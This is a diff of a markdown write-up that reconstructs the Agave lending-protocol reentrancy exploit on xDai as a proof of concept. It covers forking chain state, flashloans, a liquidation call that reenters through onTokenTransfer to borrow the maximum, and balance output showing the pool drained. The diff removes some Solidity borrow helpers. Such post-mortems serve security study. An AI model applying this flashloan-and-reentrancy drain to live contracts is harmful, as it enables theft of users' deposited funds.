@@ -1,5 +1,22 @@
 # Agave 
 
+# Table of Contents
+- [Agave](#agave)
+  - [What's Agave?](#whats-agave)
+  - [Amount stolen](#amount-stolen)
+  - [Vulnerability](#vulnerability)
+- [Proof of Concept (PoC)](#proof-of-concept-poc)
+  - [Setup](#setup)
+  - [Prepare Phase](#prepare-phase)
+    - [Initial Condition - Health Factor Above 1](#initial-condition---health-factor-above-1)
+    - [Transition - Advance Time by One Hour](#transition---advance-time-by-one-hour)
+    - [Liquidation Mechanism](#liquidation-mechanism)
+    - [Purpose - Liquidation Call](#purpose---liquidation-call)
+  - [Flashloan and Deposit Phase](#flashloan-and-deposit-phase)
+- [Flashloan Attack Logic](#flashloan-attack-logic)
+- [Exploit Completion](#exploit-completion)
+- [Conclusion](#conclusion)
+
 ## What's Agave?
 
 Agave ($AGVE) is a decentralized money market protocol on the xDai chain, developed by the 1Hive community as a fork of Aave. Agave integrates features from 1Hive projects like Celeste and Honeyswap.
@@ -14,7 +31,9 @@ Users deposit tokens, receiving 'aTokens' that accrue interest and can be used a
 
 Reentrancy
 
-## proof of concept (PoC) 
+# proof of concept (PoC) 
+
+## Setup
 
 We begin by forking the contract state before initiating any hack, to create a replicated environment that mirrors the state of the smart contract at the time before the exploit happened
 
@@ -67,18 +86,21 @@ Finally, we establish the initial state of the contract by minting the original 
 ```
 
 
-### Prepare Phase
+## Prepare Phase
 
 
 #### Initial Condition - Health Factor Above 1
 
 **Objective:** 
+
 Ensure that the health factor is initially slightly above 1.
 
 **Reasoning:**
+
 The health factor is important in DeFi platforms, especially those involving lending and borrowing. It is a measure of an account's collateralization level, indicating the ratio of the value of assets to the value of outstanding liabilities. A health factor above 1 indicates that the account has sufficient collateral to cover its liabilities.
 
 #### Transition - Advance Time by One Hour
+
 **Objective:**
 Advance time by one hour after the initial prepare.
 
@@ -145,7 +167,7 @@ These actions collectively set up a scenario where you have a significant LINK d
 
 
 
-### Flashloan and Deposit Phase
+## Flashloan and Deposit Phase
    - Action: Execute a flashloan and deposit tokens.
    - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.
 
@@ -165,7 +187,7 @@ This function simulates a flashloan from Uniswap, passing control to the **`atta
     }
 ```
 
-#### Flashloan Attack Logic
+## Flashloan Attack Logic
 
 The `attackLogic` function orchestrates a flashloan-based attack on the Aave lending pool, exploiting vulnerabilities in the protocol. Here's a breakdown of its key steps:
 
@@ -252,63 +274,7 @@ After detecting the second occurrence of this event, it calls borrowMaxtokens to
 ```
 
 
-<details>
-  <summary>maxBorrow Function</summary>
-
-```solidity
-function maxBorrow(address asset, bool maxxx) internal {
-    IERC20 assetX = IERC20(asset);
-    uint256 assetXbal = assetX.balanceOf(address(this));
-    uint256 reserveTokenbal = getAvailableLiquidity(asset);
-    console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
-    uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
-    if (BorrowAmount > 0) {
-        console.log("Going to boorrow %d of asset %s", BorrowAmount, asset);
-        lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
-        uint256 diff = assetX.balanceOf(address(this)) - assetXbal;
-        require(diff == BorrowAmount, "did not borrow any funds");
-        console.log("borrowed %d successfully", BorrowAmount);
-    } else {
-        console.log("NO amount borrowed???");
-    }
-}
-```
-
-
-
-```solidity
-        function getMaxBorrow(address asset, uint256 depositedamt) public view returns (uint256) {
-        // Get the LTV (Loan To Value) of the asset from the Aave Protocol
-        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
-        uint256 ltv = data.configuration.data & 0xFFFF;
-
-        // Get the latest price of the WETH token from the Aave Oracle
-        uint256 wethPrice = priceOracle.getAssetPrice(address(weth));
-        console.log(ltv);
-
-        // Adjust for token decimals
-        uint256 totalCollateralValueInEth = (depositedamt * wethPrice) / (10 ** 18); // normalize the deposited amount to ETH
-
-        // Calculate the maximum borrowable value
-        uint256 maxBorrowValueInEth = (totalCollateralValueInEth * ltv) / 10_000; // LTV is scaled by a factor of 10000
-
-        // Get the latest price of the borrowable asset from the Aave Oracle
-        uint256 assetPriceInEth = priceOracle.getAssetPrice(asset);
-
-        // Calculate the maximum borrowable amount, adjust it back to the borrowing asset's decimals
-        uint256 maxBorrowAmount = (maxBorrowValueInEth * (10 ** 18)) / assetPriceInEth;
-        uint256 scaleDownAmt =
-            WETH.decimals() > IERC20(asset).decimals() ? WETH.decimals() - IERC20(asset).decimals() : 0;
-        if (scaleDownAmt > 0) {
-            return ((maxBorrowAmount / 10 ** scaleDownAmt) * 100) / 100;
-        }
-        return (maxBorrowAmount * 100) / 100;
-    }
-```
-</details>
-
-
-### Exploit Completion:
+## Exploit Completion:
 Successful execution drains funds from the lending pool.
 
 
@@ -340,3 +306,29 @@ Successful execution drains funds from the lending pool.
   --- End of balances --- 
 
 ```
+
+## Conclusion
+
+The reentrancy attack in this context occurs within the `attackLogic` function, specifically when the liquidation call is initiated on the WETH asset within the Aave lending pool. Let's break down one more time how the reentrancy attack was executed:
+
+### 1. Initiate Liquidation Call
+
+- The `lendingPool.liquidationCall` function is invoked, initiating a liquidation call on the WETH asset.
+- This call triggers the `ontokentransfer` function on the `.burn` method of the aToken, creating a reentrancy point.
+
+### 2. Reentrancy in Liquidation Call
+
+- As part of the Aave protocol's design, the `liquidationCall` function interacts with the aToken's `.burn` method.
+- During this interaction, the aToken executes a series of actions, including transferring funds and updating internal states.
+
+### 3. Reentrancy into External Function
+
+- Since the `.burn` method can trigger external calls, control is transferred back to the `onTokenTransfer` function in your contract.
+
+### 4. BorrowMaxtokens Execution
+
+- The `borrowMaxtokens` function is then executed, allowing for the maximization of borrowing.
+- This function interacts with the Aave lending pool to borrow additional funds based on the current state and conditions.
+
+In summary, the reentrancy attack takes advantage of the reentrancy point created during the liquidation call. By triggering external calls within the Aave protocol, control is momentarily transferred back to your contract, allowing you to execute further actions, such as additional borrowing. This sequence of events exploits the vulnerability in the Aave protocol, leading to the reentrancy attack.
+
